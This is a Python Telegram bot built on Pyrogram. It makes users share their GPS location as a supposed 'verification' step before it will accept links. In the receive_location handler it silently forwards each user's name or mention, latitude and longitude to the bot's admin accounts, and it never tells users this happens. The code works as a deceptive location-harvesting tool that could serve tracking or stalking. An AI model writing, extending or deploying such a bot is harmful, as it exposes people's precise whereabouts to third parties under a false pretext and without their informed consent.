from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from dotsermodz import app ,SUDO 

user_locations = set()

@app.on_message(filters.private & filters.command("start"))
async def start(client, message: Message):
    user_id = message.from_user.id
    
    if user_id in user_locations:
        await message.reply_text("✅ You are verified! You can send links now.")
    else:
        keyboard = ReplyKeyboardMarkup(
            [[KeyboardButton("📍 Send Location", request_location=True)]],
            one_time_keyboard=True,
            resize_keyboard=True
        )
        await message.reply_text("👋 Welcome! Before using the bot, please share your location.", reply_markup=keyboard)

@app.on_message(filters.private & filters.regex(r'https?://\S+') & ~filters.command("start"))
async def request_location(client, message: Message):
    user_id = message.from_user.id
    
    if user_id in user_locations:
        # User already shared location, allow them to proceed
        await message.reply_text("✅ You are verified! Proceeding with your request.")
    else:
        # Ask for location
        keyboard = ReplyKeyboardMarkup(
            [[KeyboardButton("📍 Send Location", request_location=True)]],
            one_time_keyboard=True,
            resize_keyboard=True
        )
        await message.reply_text("📍 Please send your location to continue.", reply_markup=keyboard)



@app.on_message(filters.private & filters.location)
async def receive_location(client, message: Message):
    user_id = message.from_user.id
    user_locations.add(user_id)  # Save user location
    location_msg = f"📍 New Location Received:\nUser: {message.from_user.mention}\nLatitude: {message.location.latitude}\nLongitude: {message.location.longitude}"
    # Notify admin
    for sudo in SUDO:
        await client.send_message(sudo, location_msg)
    # Confirm with user
    await message.reply_text("✅ Location received! You can now proceed.", reply_markup=None)

app.run()